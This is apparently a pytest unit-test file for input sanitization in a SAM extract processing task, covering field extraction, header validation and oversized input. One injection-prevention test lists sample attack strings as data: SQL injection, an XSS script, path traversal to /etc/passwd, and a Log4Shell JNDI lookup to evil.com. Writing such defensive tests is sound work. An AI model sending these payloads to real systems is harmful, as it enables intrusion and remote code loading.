"""
Unit tests for enhanced SAM extract processing security.
"""

import pytest
from unittest.mock import Mock, patch, mock_open
from io import BytesIO

from src.task.sam_extracts.process_sam_extracts import (
    ProcessSamExtractsTask,
    get_token_value,
    ExtractIndex
)
from src.util.input_sanitizer import InputValidationError


class TestGetTokenValue:
    """Test cases for the enhanced get_token_value function."""
    
    def test_valid_token_extraction(self):
        """Test successful token extraction."""
        tokens = ["field1", "field2", "field3"]
        result = get_token_value(tokens, 2)
        assert result == "field2"
    
    def test_blank_value_allowed(self):
        """Test extraction of blank value when allowed."""
        tokens = ["field1", "", "field3"]
        result = get_token_value(tokens, 2, can_be_blank=True)
        assert result == ""
    
    def test_blank_value_not_allowed(self):
        """Test rejection of blank value when not allowed."""
        tokens = ["field1", "", "field3"]
        with pytest.raises(ValueError, match="never be blank"):
            get_token_value(tokens, 2, can_be_blank=False)
    
    def test_index_out_of_range(self):
        """Test handling of index out of range."""
        tokens = ["field1", "field2"]
        with pytest.raises(ValueError, match="fewer values than expected"):
            get_token_value(tokens, 5)
    
    def test_invalid_index_type(self):
        """Test handling of invalid index type."""
        tokens = ["field1", "field2"]
        with pytest.raises(ValueError, match="positive integer"):
            get_token_value(tokens, "invalid")
    
    def test_invalid_index_value(self):
        """Test handling of invalid index value."""
        tokens = ["field1", "field2"]
        with pytest.raises(ValueError, match="positive integer"):
            get_token_value(tokens, 0)
    
    def test_non_list_tokens(self):
        """Test handling of non-list tokens."""
        with pytest.raises(ValueError, match="must be a list"):
            get_token_value("not a list", 1)
    
    def test_non_string_token(self):
        """Test handling of non-string token values."""
        tokens = ["field1", 123, "field3"]
        with pytest.raises(ValueError, match="Expected string value"):
            get_token_value(tokens, 2)
    
    def test_oversized_field(self):
        """Test handling of oversized field values."""
        large_field = "x" * 10001  # Exceeds 10000 char limit
        tokens = ["field1", large_field, "field3"]
        with pytest.raises(ValueError, match="exceeds maximum length"):
            get_token_value(tokens, 2)
    
    def test_null_byte_removal(self):
        """Test removal of null bytes from field values."""
        tokens = ["field1", "value\x00with\x00nulls", "field3"]
        result = get_token_value(tokens, 2)
        assert result == "valuewithnulls"


class TestProcessDat:
    """Test cases for the enhanced process_dat method."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.mock_session = Mock()
        self.task = ProcessSamExtractsTask(self.mock_session)
    
    def test_unicode_decode_error_handling(self):
        """Test handling of Unicode decode errors."""
        # Create a file with invalid UTF-8 bytes
        invalid_bytes = b"\x80\x81\x82"
        dat_file = BytesIO(invalid_bytes)
        
        # Mock the increment method
        self.task.increment = Mock()
        
        result = self.task.process_dat(dat_file, {})
        
        # Should increment ROWS_SKIPPED_COUNT for invalid bytes
        assert self.task.increment.called
        assert result.processed_entities == []
    
    def test_empty_line_handling(self):
        """Test handling of empty lines."""
        dat_file = BytesIO(b"\n\n\n")
        
        self.task.increment = Mock()
        
        result = self.task.process_dat(dat_file, {})
        
        # Should not process empty lines
        assert result.processed_entities == []
    
    def test_oversized_line_handling(self):
        """Test handling of extremely long lines."""
        # Create a line that exceeds the 100KB limit
        long_line = b"x" * 100001
        dat_file = BytesIO(long_line)
        
        self.task.increment = Mock()
        
        result = self.task.process_dat(dat_file, {})
        
        # Should skip oversized lines
        self.task.increment.assert_called()
        assert result.processed_entities == []
    
    @patch('src.task.sam_extracts.process_sam_extracts.logger')
    def test_header_validation(self, mock_logger):
        """Test validation of header/footer lines."""
        # Valid header
        valid_header = b"BOF FOUO V2 20250726 20250726 0001234 0001000\n"
        dat_file = BytesIO(valid_header)
        
        self.task.increment = Mock()
        
        result = self.task.process_dat(dat_file, {})
        
        # Should process header successfully
        mock_logger.info.assert_called()
    
    @patch('src.task.sam_extracts.process_sam_extracts.logger')
    def test_invalid_header_handling(self, mock_logger):
        """Test handling of invalid header format."""
        # Invalid header with wrong number of fields
        invalid_header = b"BOF FOUO V2 20250726\n"
        dat_file = BytesIO(invalid_header)
        
        self.task.increment = Mock()
        
        result = self.task.process_dat(dat_file, {})
        
        # Should warn about invalid header
        mock_logger.warning.assert_called()
    
    @patch('src.task.sam_extracts.process_sam_extracts.logger')
    def test_non_numeric_header_values(self, mock_logger):
        """Test handling of non-numeric values in header."""
        # Header with non-numeric sequence/count
        invalid_header = b"BOF FOUO V2 20250726 20250726 invalid count\n"
        dat_file = BytesIO(invalid_header)
        
        self.task.increment = Mock()
        
        result = self.task.process_dat(dat_file, {})
        
        # Should warn about invalid numeric values
        mock_logger.warning.assert_called()
    
    @patch('src.task.sam_extracts.process_sam_extracts.sanitize_delimited_line')
    @patch('src.task.sam_extracts.process_sam_extracts.logger')
    def test_line_parsing_error_handling(self, mock_logger, mock_sanitize):
        """Test handling of line parsing errors."""
        # Mock sanitize_delimited_line to raise an error
        mock_sanitize.side_effect = InputValidationError("Invalid line format")
        
        data_line = b"field1|field2|field3\n"
        dat_file = BytesIO(data_line)
        
        self.task.increment = Mock()
        
        result = self.task.process_dat(dat_file, {})
        
        # Should log warning and skip line
        mock_logger.warning.assert_called()
        self.task.increment.assert_called()
    
    @patch('src.task.sam_extracts.process_sam_extracts.get_token_value')
    @patch('src.task.sam_extracts.process_sam_extracts.logger')
    def test_field_extraction_error_handling(self, mock_logger, mock_get_token):
        """Test handling of field extraction errors."""
        # Mock get_token_value to raise an error
        mock_get_token.side_effect = ValueError("Invalid field access")
        
        data_line = b"field1|field2|field3\n"
        dat_file = BytesIO(data_line)
        
        self.task.increment = Mock()
        
        result = self.task.process_dat(dat_file, {})
        
        # Should log warning and skip line
        mock_logger.warning.assert_called()
        self.task.increment.assert_called()


class TestSamExtractSecurity:
    """Test cases for overall SAM extract security improvements."""
    
    def test_malformed_delimited_data(self):
        """Test handling of malformed delimited data."""
        # Data with inconsistent field counts
        malformed_lines = [
            "field1|field2",
            "field1|field2|field3|field4",
            "field1"
        ]
        
        from src.util.input_sanitizer import sanitize_delimited_line
        
        # Should handle each line appropriately
        result1 = sanitize_delimited_line(malformed_lines[0])
        assert len(result1) == 2
        
        result2 = sanitize_delimited_line(malformed_lines[1])
        assert len(result2) == 4
        
        result3 = sanitize_delimited_line(malformed_lines[2])
        assert len(result3) == 1
    
    def test_injection_attempt_prevention(self):
        """Test prevention of potential injection attempts."""
        # Test various injection patterns that should be sanitized
        dangerous_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "\x00null\x01byte\x02injection",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        from src.util.input_sanitizer import sanitize_string
        
        for dangerous_input in dangerous_inputs:
            sanitized = sanitize_string(dangerous_input)
            # Should not contain dangerous patterns after sanitization
            assert "<script>" not in sanitized
            assert "\x00" not in sanitized
            assert "\x01" not in sanitized
            assert "\x02" not in sanitized
    
    def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion attacks."""
        from src.util.input_sanitizer import InputValidationError, sanitize_string
        
        # Test extremely long input
        with pytest.raises(InputValidationError):
            sanitize_string("x" * 100000, max_length=1000)
        
        # Test deeply nested structure (would be tested in actual usage)
        # This is more relevant for JSON validation which is tested separately